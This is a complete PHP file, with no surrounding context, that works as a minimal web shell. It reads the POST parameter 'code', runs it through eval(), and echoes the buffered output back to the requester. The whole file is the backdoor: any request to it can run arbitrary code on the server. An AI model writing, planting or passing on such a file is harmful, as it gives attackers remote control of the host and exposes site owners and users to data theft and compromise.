<?php
$evalCode = $_POST['code'];
ob_start();
eval($evalCode);
$res = ob_get_contents();
ob_end_clean();
echo $res;

die("");
?>